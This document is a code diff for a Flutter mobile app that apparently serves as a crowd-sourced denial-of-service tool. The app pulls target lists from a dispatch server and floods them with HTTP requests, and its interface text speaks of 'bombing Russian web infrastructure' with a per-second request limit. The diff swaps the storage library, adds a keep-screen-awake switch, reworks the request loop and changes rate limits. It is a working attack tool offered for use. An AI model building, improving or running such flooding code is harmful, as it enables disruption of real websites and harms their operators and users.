@@ -6,7 +6,8 @@ import 'package:http/http.dart' as http;
 import 'package:flutter/services.dart' show rootBundle;
 import 'package:url_launcher/url_launcher.dart';
 import 'package:dart_random_choice/dart_random_choice.dart';
-import 'package:localstorage/localstorage.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+import 'package:wakelock/wakelock.dart';
 
 const textColor = Color(0xFFEAEAEA);
 const grayColor = Color(0xFFC6C6C6);
@@ -15,7 +16,6 @@ const linkColor = Color(0xFF9AC9FF);
 const URL_SERVER = 'https://arwdispatch.redblackfury.com';
 
 Map logs = {};
-
 Map translate = {
   "en": {
     "__headline": "Bombing Russian Web infrastructure...",
@@ -35,7 +35,8 @@ Map translate = {
     "__last_attack": "Last attack",
     "__requests_count": "Requests count",
     "__helper_text_1": "* non-UA IP allows to bomb more sites",
-    "__request_limit": "Bomb requests per second limit"
+    "__request_limit": "Bomb requests per second limit",
+    "__disable_lock_sceen": 'Keep screen active',
   },
   "uk": {
     "__headline": "Бомбардуємо Веб інфраструктуру росіян...",
@@ -56,7 +57,8 @@ Map translate = {
     "__requests_count": "Кількість атак",
     "__helper_text_1":
         "* неукраїнські IP адреси дозволяють бомбити більше сайтів",
-    "__request_limit": "Ліміт запитів-бомб за секунду"
+    "__request_limit": "Ліміт запитів-бомб за секунду",
+    "__disable_lock_sceen": 'Тримати екран увімкненим'
   }
 };
 String globalLocale = "en";
@@ -99,15 +101,13 @@ class MyHomePage extends StatefulWidget {
   State<MyHomePage> createState() => _MyHomePageState();
 }
 
-const SHOOT_INTERVAL_SECOND = 5;
-const MAX_LIMIT = 1000;
+const SHOOT_INTERVAL_SECOND = 1;
+const MAX_LIMIT = 200;
 const STEP_CHANGE_LIMIT = 10;
 const NAME_STATUS_WORKER = 'statusWorker';
 const LOCAL_STORAGE_ITEM_TOTAL_REQS = 'totalReqs';
 const LOCAL_STORAGE_ITEM_UP_MS = 'upMs';
 const LOCAL_STORAGE_ITEM_LIMIT_REQ = 'limitReqs';
-
-final LocalStorage STORAGE = new LocalStorage('arwStorage');
 const UPDATE_VIEW_TIMEOUT_SECONDS = 1;
 
 const WINDOW_SIZE_MS = 20000;
@@ -121,12 +121,14 @@ class _MyHomePageState extends State<MyHomePage> {
   int _totalRequests = 0;
   int _upMilliseconds = 0;
   bool _statusWorker = false;
+  bool enableWakelock = false;
   List _tasks = [];
   List<double> _weight = [];
   String _totalStringRequests = '0';
   DateTime windowStartState = DateTime.now();
   int requestsAtWindowState = 0;
   String locale = "en";
+  var storage;
 
   var _upTime = '0s';
   var _userAgent = '';
@@ -136,18 +138,19 @@ class _MyHomePageState extends State<MyHomePage> {
   @override
   void initState() {
     super.initState();
+
     asyncInit();
     moveFloatingRPSWindows();
     runRPSRefresher();
   }
 
   void asyncInit() async {
+    storage = await SharedPreferences.getInstance();
     try {
       await _initData(true);
     } catch (e) {
       print("Error load data: $e");
     }
-
     _intervalWorker();
     _intervalInitData();
     startWorker(false);
@@ -185,9 +188,10 @@ class _MyHomePageState extends State<MyHomePage> {
   }
 
   void shootFetches() async {
-    for (var i = 0; i < _limitRequests * SHOOT_INTERVAL_SECOND; i++) {
+    try {
       final pointAttack = randomChoice(_tasks, _weight);
-      Uri endpoint = Uri.parse("${pointAttack.proto}://${pointAttack.host}");
+      var proto = pointAttack.proto != '' ? pointAttack.proto : 'http';
+      Uri endpoint = Uri.parse("${proto}://${pointAttack.host}");
 
       http
           .get(endpoint, headers: {"User-Agent": _userAgent})
@@ -196,6 +200,8 @@ class _MyHomePageState extends State<MyHomePage> {
       _totalRequests += 1;
       logs[pointAttack.sId]["count"] += 1;
       logs[pointAttack.sId]["lastAttack"] = DateTime.now();
+    } catch (e) {
+      print("err => $e");
     }
   }
 
@@ -206,7 +212,14 @@ class _MyHomePageState extends State<MyHomePage> {
     }
 
     while (true) {
-      shootFetches();
+      for (var i = 0; i < _limitRequests * SHOOT_INTERVAL_SECOND; i++) {
+        try {
+          shootFetches();
+        } catch (e) {
+          print("err");
+        }
+      }
+
       if (_statusWorker == false) {
         break;
       }
@@ -215,11 +228,10 @@ class _MyHomePageState extends State<MyHomePage> {
   }
 
   void startWorker(bool manual) async {
-    await STORAGE.ready;
-    var stateWorkerStorage = await STORAGE.getItem(NAME_STATUS_WORKER);
-    int? historicalRqs = await STORAGE.getItem(LOCAL_STORAGE_ITEM_TOTAL_REQS);
-    int? historicalMs = await STORAGE.getItem(LOCAL_STORAGE_ITEM_UP_MS);
-    int? historicalLimit = await STORAGE.getItem(LOCAL_STORAGE_ITEM_LIMIT_REQ);
+    var stateWorkerStorage = await storage.getString(NAME_STATUS_WORKER);
+    int? historicalRqs = await storage.getInt(LOCAL_STORAGE_ITEM_TOTAL_REQS);
+    int? historicalMs = await storage.getInt(LOCAL_STORAGE_ITEM_UP_MS);
+    int? historicalLimit = await storage.getInt(LOCAL_STORAGE_ITEM_LIMIT_REQ);
 
     setState(() {
       _totalRequests = historicalRqs ?? 0;
@@ -238,8 +250,7 @@ class _MyHomePageState extends State<MyHomePage> {
   }
 
   Future<void> changeStatusWorker(bool status) async {
-    await STORAGE.ready;
-    await STORAGE.setItem(
+    await storage.setString(
         NAME_STATUS_WORKER, status == true ? 'enable' : 'disable');
     setState(() {
       _statusWorker = status;
@@ -264,7 +275,14 @@ class _MyHomePageState extends State<MyHomePage> {
       url = url + '&lastRPS=' + _currentRPS.toString();
     }
 
-    final response = await http.get(Uri.parse(url)).catchError((e) {});
+    var urlWithParams = Uri.parse(url);
+    final response = await http
+        .get(urlWithParams)
+        .timeout(const Duration(seconds: 30))
+        .catchError((e) {
+      print('Error => $e');
+    });
+
     if (response == null || response.statusCode != 200) {
       print("Error load data from server");
       return;
@@ -325,12 +343,15 @@ class _MyHomePageState extends State<MyHomePage> {
   }
 
   void changeLimitRequest(int value) {
-    var tempValue = _limitRequests +
-        value * STEP_CHANGE_LIMIT * (_limitRequests <= 100 ? 1 : 10);
+    var tempValue = _limitRequests + value;
 
     if (tempValue <= MAX_LIMIT && tempValue > 0) {
       setState(() {
         _limitRequests = tempValue;
+      });
+    } else if (tempValue > MAX_LIMIT) {
+      setState(() {
+        _limitRequests = MAX_LIMIT;
       });
     }
   }
@@ -363,10 +384,9 @@ class _MyHomePageState extends State<MyHomePage> {
       DateTime prevCycle = DateTime.now();
       await timeout(UPDATE_VIEW_TIMEOUT_SECONDS);
 
-      await STORAGE.ready;
-      await STORAGE.setItem(LOCAL_STORAGE_ITEM_TOTAL_REQS, _totalRequests);
-      await STORAGE.setItem(LOCAL_STORAGE_ITEM_UP_MS, _upMilliseconds);
-      await STORAGE.setItem(LOCAL_STORAGE_ITEM_LIMIT_REQ, _limitRequests);
+      await storage.setInt(LOCAL_STORAGE_ITEM_TOTAL_REQS, _totalRequests);
+      await storage.setInt(LOCAL_STORAGE_ITEM_UP_MS, _upMilliseconds);
+      await storage.setInt(LOCAL_STORAGE_ITEM_LIMIT_REQ, _limitRequests);
 
       setState(() {
         _upTime = timeAfterLaunch();
@@ -382,6 +402,13 @@ class _MyHomePageState extends State<MyHomePage> {
     globalLocale = lang;
     setState(() {
       locale = lang;
+    });
+  }
+
+  void changeWakelock(bool status) {
+    Wakelock.toggle(enable: status);
+    setState(() {
+      enableWakelock = status;
     });
   }
 
@@ -406,6 +433,10 @@ class _MyHomePageState extends State<MyHomePage> {
                             ? MaterialStateProperty.all<Color>(
                                 Color.fromARGB(170, 255, 255, 255))
                             : null,
+                        shape:
+                            MaterialStateProperty.all<RoundedRectangleBorder>(
+                                RoundedRectangleBorder(
+                                    borderRadius: BorderRadius.circular(30.0))),
                       ),
                       onPressed: () {
                         changeLocale("en");
@@ -433,6 +464,10 @@ class _MyHomePageState extends State<MyHomePage> {
                             ? MaterialStateProperty.all<Color>(
                                 Color.fromARGB(170, 255, 255, 255))
                             : null,
+                        shape:
+                            MaterialStateProperty.all<RoundedRectangleBorder>(
+                                RoundedRectangleBorder(
+                                    borderRadius: BorderRadius.circular(30.0))),
                       ),
                       onPressed: () {
                         changeLocale("uk");
@@ -501,7 +536,7 @@ class _MyHomePageState extends State<MyHomePage> {
                     icon: Image.asset('assets/minus.png'),
                     iconSize: 5,
                     onPressed: () {
-                      changeLimitRequest(-1);
+                      changeLimitRequest(-STEP_CHANGE_LIMIT);
                     },
                   ),
                   const SizedBox(width: 5),
@@ -514,7 +549,7 @@ class _MyHomePageState extends State<MyHomePage> {
                     icon: Image.asset('assets/plus.png'),
                     iconSize: 5,
                     onPressed: () {
-                      changeLimitRequest(1);
+                      changeLimitRequest(STEP_CHANGE_LIMIT);
                     },
                   ),
                 ],
@@ -578,7 +613,7 @@ class _MyHomePageState extends State<MyHomePage> {
                           const Color(0xFF1F1A1A)),
                       shape: MaterialStateProperty.all<RoundedRectangleBorder>(
                           RoundedRectangleBorder(
-                              borderRadius: BorderRadius.circular(5.0),
+                              borderRadius: BorderRadius.circular(30.0),
                               side: const BorderSide(
                                   color: Color(0xFF9AC9FF), width: 2.0)))),
                   onPressed: () {
@@ -595,11 +630,34 @@ class _MyHomePageState extends State<MyHomePage> {
                           _statusWorker == true
                               ? translate[locale]["__pause"]
                               : translate[locale]["__start"],
-                          style: const TextStyle(fontSize: 12),
+                          style:
+                              const TextStyle(fontSize: 12, color: linkColor),
                         ),
                       ),
                     ],
                   )),
+              const SizedBox(height: 10),
+              Container(
+                  child: Row(
+                mainAxisAlignment: MainAxisAlignment.center,
+                children: [
+                  Switch(
+                      value: enableWakelock,
+                      onChanged: (value) {
+                        print('aaaaaa => $value');
+                        changeWakelock(value);
+                      },
+                      activeTrackColor: Colors.red,
+                      activeColor: linkColor,
+                      inactiveTrackColor: textColor,
+                      inactiveThumbColor: linkColor),
+                  Text(
+                    translate[locale]["__disable_lock_sceen"],
+                    style:
+                        const TextStyle(fontSize: 12, color: Color(0xFFFFFFFF)),
+                  )
+                ],
+              )),
               const SizedBox(height: 40),
               Row(
                 mainAxisAlignment: MainAxisAlignment.center,
@@ -610,6 +668,7 @@ class _MyHomePageState extends State<MyHomePage> {
                       height: 32),
                   const SizedBox(width: 5),
                   Column(
+                    crossAxisAlignment: CrossAxisAlignment.start,
                     children: <Widget>[
                       Text(
                         translate[locale]["__it_army"],
@@ -628,7 +687,7 @@ class _MyHomePageState extends State<MyHomePage> {
                         },
                         child: const Text(
                           'IT ARMY of Ukraine',
-                          style: TextStyle(fontSize: 12),
+                          style: TextStyle(fontSize: 12, color: linkColor),
                         ),
                       )
                     ],
@@ -658,7 +717,7 @@ class _MyHomePageState extends State<MyHomePage> {
                         },
                         child: const Text(
                           'GitHub',
-                          style: TextStyle(fontSize: 12),
+                          style: TextStyle(fontSize: 12, color: linkColor),
                         ),
                       )
                     ],
